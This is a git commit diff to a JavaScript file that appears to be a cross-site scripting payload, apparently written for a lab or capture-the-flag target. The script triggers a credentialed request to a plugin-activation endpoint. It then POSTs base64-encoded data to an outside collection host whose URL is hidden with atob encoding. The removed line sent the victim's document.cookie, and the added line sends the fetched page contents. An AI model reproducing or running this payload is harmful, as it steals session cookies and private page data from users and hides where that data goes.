7e4bbf68e60e9f193f7b924400785779038dead7
repierre <pierre.boudvil1@gmail.com>
2023-11-25 19:58:41 +0100

    a

--- test5.js
+++ test5.js
@@ -1,4 +1,4 @@
-fetch("http://website-l8lruj.inst.malicecyber.com/activate-plugin/1", {
+let r = await fetch("http://website-l8lruj.inst.malicecyber.com/activate-plugin/1", {
     "credentials": "include",
     "referrer": "http://website-l8lruj.inst.malicecyber.com/show-plugins",
     "method": "GET"
@@ -8,6 +8,6 @@ fetch("http://website-l8lruj.inst.malicecyber.com/activate-plugin/1", {
 fetch(atob('aHR0cHM6Ly9lb2pvY3d1a3hodWh6d3QubS5waXBlZHJlYW0ubmV0') + '/debug4', 
     {
         method: 'POST',
-        body: btoa(document.cookie)
+        body: btoa(await r.text())
     }
 )
